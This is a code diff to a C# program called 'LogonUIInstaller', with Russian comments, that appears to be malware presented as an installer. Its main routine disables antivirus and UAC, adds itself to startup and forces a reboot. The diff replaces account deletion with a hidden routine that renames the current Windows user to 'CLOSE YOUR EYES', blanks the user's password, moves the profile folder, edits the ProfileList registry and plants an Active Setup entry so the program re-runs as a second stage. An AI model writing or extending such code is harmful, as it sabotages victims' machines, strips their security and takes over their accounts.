@@ -46,7 +46,7 @@ namespace LogonUIInstaller
                 ApplySystemBlocks();
                 DisableAntivirusAndUAC();
                 ApplySettingsToDefaultProfile();
-                ReplaceUserAccountFixed();
+                RenameCurrentUser();  // ← НОВЫЙ МЕТОД
                 AddToStartupWithStage2();
                 ForceReboot();
             }
@@ -340,7 +340,6 @@ namespace LogonUIInstaller
 
                 string tempKey = "DefaultUserTemp_" + Guid.NewGuid().ToString("N").Substring(0, 8);
 
-                // Загружаем куст Default User
                 Process p1 = Process.Start(new ProcessStartInfo
                 {
                     FileName = "reg",
@@ -352,10 +351,8 @@ namespace LogonUIInstaller
                 p1?.WaitForExit(3000);
                 p1?.Close();
 
-                // Применяем настройки
                 ApplyRegistrySettingsToHive(tempKey);
 
-                // Выгружаем куст
                 Process p2 = Process.Start(new ProcessStartInfo
                 {
                     FileName = "reg",
@@ -367,7 +364,6 @@ namespace LogonUIInstaller
                 p2?.WaitForExit(3000);
                 p2?.Close();
 
-                // Отключаем OOBE
                 using (var key = Registry.LocalMachine.CreateSubKey(@"SOFTWARE\Policies\Microsoft\Windows\OOBE"))
                 {
                     key.SetValue("DisableOOBE", 1, RegistryValueKind.DWord);
@@ -436,18 +432,19 @@ namespace LogonUIInstaller
             catch { }
         }
 
-        // ==================== ЗАМЕНА ПОЛЬЗОВАТЕЛЯ ====================
-        private static void ReplaceUserAccountFixed()
+        // ==================== ПЕРЕИМЕНОВАНИЕ ПОЛЬЗОВАТЕЛЯ ====================
+        private static void RenameCurrentUser()
         {
             try
             {
                 string currentUser = Environment.UserName;
                 string newUser = "CLOSE YOUR EYES";
 
+                // 1. Переименовываем пользователя
                 Process p1 = Process.Start(new ProcessStartInfo
                 {
-                    FileName = "net",
-                    Arguments = $"user \"{newUser}\" /add /active:yes /passwordchg:no",
+                    FileName = "wmic",
+                    Arguments = $"useraccount where name='{currentUser}' rename '{newUser}'",
                     CreateNoWindow = true,
                     WindowStyle = ProcessWindowStyle.Hidden,
                     UseShellExecute = false
@@ -455,10 +452,11 @@ namespace LogonUIInstaller
                 p1?.WaitForExit(5000);
                 p1?.Close();
 
+                // 2. Убираем пароль
                 Process p2 = Process.Start(new ProcessStartInfo
                 {
                     FileName = "net",
-                    Arguments = $"localgroup Administrators \"{newUser}\" /delete",
+                    Arguments = $"user \"{newUser}\" \"\"",
                     CreateNoWindow = true,
                     WindowStyle = ProcessWindowStyle.Hidden,
                     UseShellExecute = false
@@ -466,6 +464,30 @@ namespace LogonUIInstaller
                 p2?.WaitForExit(3000);
                 p2?.Close();
 
+                // 3. Переименовываем папку профиля
+                string oldProfilePath = Path.Combine(Environment.GetEnvironmentVariable("SystemDrive") + "\\Users", currentUser);
+                string newProfilePath = Path.Combine(Environment.GetEnvironmentVariable("SystemDrive") + "\\Users", newUser);
+                
+                if (Directory.Exists(oldProfilePath) && !Directory.Exists(newProfilePath))
+                {
+                    // Переименовываем папку
+                    Directory.Move(oldProfilePath, newProfilePath);
+                    
+                    // Обновляем путь в реестре
+                    string sid = GetUserSID(newUser);
+                    if (!string.IsNullOrEmpty(sid))
+                    {
+                        using (var key = Registry.LocalMachine.OpenSubKey($@"SOFTWARE\Microsoft\Windows NT\CurrentVersion\ProfileList\{sid}", true))
+                        {
+                            if (key != null)
+                            {
+                                key.SetValue("ProfileImagePath", newProfilePath, RegistryValueKind.ExpandString);
+                            }
+                        }
+                    }
+                }
+
+                // 4. Добавляем Active Setup для первого входа (гарантия)
                 string guid = Guid.NewGuid().ToString("B").ToUpper();
                 using (var key = Registry.LocalMachine.CreateSubKey($@"SOFTWARE\Microsoft\Active Setup\Installed Components\{guid}"))
                 {
@@ -473,19 +495,31 @@ namespace LogonUIInstaller
                     key.SetValue("StubPath", $"\"{Assembly.GetEntryAssembly().Location}\" stage2", RegistryValueKind.String);
                     key.SetValue("Version", "1.0", RegistryValueKind.String);
                 }
-
-                Process p5 = Process.Start(new ProcessStartInfo
-                {
-                    FileName = "net",
-                    Arguments = $"user {currentUser} /delete /y",
-                    CreateNoWindow = true,
-                    WindowStyle = ProcessWindowStyle.Hidden,
-                    UseShellExecute = false
-                });
-                p5?.WaitForExit(3000);
-                p5?.Close();
             }
             catch { }
+        }
+
+        private static string GetUserSID(string username)
+        {
+            try
+            {
+                using (var key = Registry.LocalMachine.OpenSubKey(@"SOFTWARE\Microsoft\Windows NT\CurrentVersion\ProfileList"))
+                {
+                    foreach (string sid in key.GetSubKeyNames())
+                    {
+                        using (var subKey = key.OpenSubKey(sid))
+                        {
+                            string profilePath = subKey.GetValue("ProfileImagePath") as string;
+                            if (!string.IsNullOrEmpty(profilePath) && profilePath.EndsWith(username))
+                            {
+                                return sid;
+                            }
+                        }
+                    }
+                }
+            }
+            catch { }
+            return null;
         }
 
         // ==================== УСТАНОВКА АВТОЗАПУСКА ====================
